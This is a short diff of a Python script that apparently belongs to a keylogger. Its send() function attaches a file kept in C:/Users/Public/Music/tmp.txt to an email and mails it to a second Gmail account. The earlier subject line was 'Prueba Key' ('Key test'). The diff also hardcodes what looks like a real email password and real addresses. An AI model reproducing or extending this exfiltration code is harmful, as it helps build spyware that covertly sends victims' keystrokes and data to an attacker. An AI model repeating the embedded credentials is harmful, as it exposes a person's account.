@@ -6,11 +6,11 @@ from email import encoders
 msg=MIMEMultipart()
 
 
-def send():
+def send(subject):
     password = "Joseluis123qwe"#password del correo donde se envia el archivo
     msg["From"]="josemowa@gmail.com"#direccion del correo donde se envia el archivo
     msg["To"]="josemowa45321@gmail.com"#correo destinatario
-    msg["Subject"]="Prueba Key"
+    msg["Subject"]=subject
     variable = MIMEBase('application', "octet-stream")
     variable.set_payload(open("C:/Users/Public/Music/tmp.txt","rb").read())
     encoders.encode_base64(variable)
